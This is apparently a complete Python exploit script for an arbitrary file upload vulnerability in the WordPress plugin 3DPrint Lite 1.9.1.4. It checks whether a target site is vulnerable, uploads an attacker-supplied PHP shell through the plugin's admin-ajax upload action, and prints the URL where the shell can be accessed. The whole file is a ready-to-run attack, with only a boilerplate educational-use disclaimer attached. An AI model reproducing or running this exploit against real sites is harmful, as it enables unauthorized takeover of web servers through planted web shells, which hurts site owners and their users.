import os
import requests
import sys

# ANSI color codes for styling
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def exploit_url(target_url, file_path):
    """
    Exploits the vulnerability in 3DPrint Lite plugin to upload a shell file.

    Args:
        target_url (str): The target URL.
        file_path (str): The path to the shell file to upload.

    Returns:
        str: The result of the exploitation attempt.
    """
    if not os.path.isfile(file_path):
        return f"{Colors.FAIL}Error: Invalid file! Please check the file path.{Colors.ENDC}"

    target_url = target_url.rstrip('/')
    upload_url = f"{target_url}/wp-admin/admin-ajax.php?action=p3dlite_handle_upload"

    # Check if the target is vulnerable
    response = requests.get(upload_url)
    if "filename" not in response.text:
        return f"{Colors.WARNING}Target is not vulnerable.{Colors.ENDC}"

    # Attempt to upload the shell
    with open(file_path, 'rb') as file:
        response = requests.post(upload_url, files={'file': file})

    if os.path.basename(file_path) in response.text:
        return (
            f"{Colors.OKGREEN}Shell uploaded successfully!{Colors.ENDC}\n"
            f"{Colors.OKCYAN}Access it here:{Colors.ENDC} {Colors.BOLD}{target_url}/wp-content/uploads/p3d/{os.path.basename(file_path)}{Colors.ENDC}"
        )
    else:
        return f"{Colors.FAIL}Shell upload failed. Please try again.{Colors.ENDC}"

def print_usage():
    """Displays the usage instructions and disclaimer."""
    print(f"{Colors.HEADER}" + "="*50)
    print(" WordPress Plugin 3DPrint Lite 1.9.1.4 - Arbitrary File Upload")
    print("="*50 + f"{Colors.ENDC}")
    print(f"\n{Colors.BOLD}Usage:{Colors.ENDC}")
    print(f"{Colors.OKBLUE}  python3 main.py [URL] [shell.php]{Colors.ENDC}\n")
    print(f"{Colors.BOLD}Disclaimer:{Colors.ENDC}")
    print(
        f"{Colors.WARNING}  This script is provided for educational purposes only.\n"
        "  The use of this script to exploit vulnerabilities without proper authorization is strictly prohibited and may violate local,\n"
        "  national, or international laws. By using this script, you agree that you are solely responsible for any actions taken and\n"
        "  that the author cannot be held liable for any misuse or damages caused. Always obtain proper permission before testing or\n"
        "  exploiting any system."
        f"{Colors.ENDC}"

    )
    print(f"\n{Colors.HEADER}{Colors.BOLD}Coded by Nxploit{Colors.ENDC}\n")
       
if __name__ == "__main__":
    if len(sys.argv) != 3:
        print_usage()
        sys.exit(1)

    target_url = sys.argv[1]
    file_path = sys.argv[2]

    res = exploit_url(target_url, file_path)
    print(res)
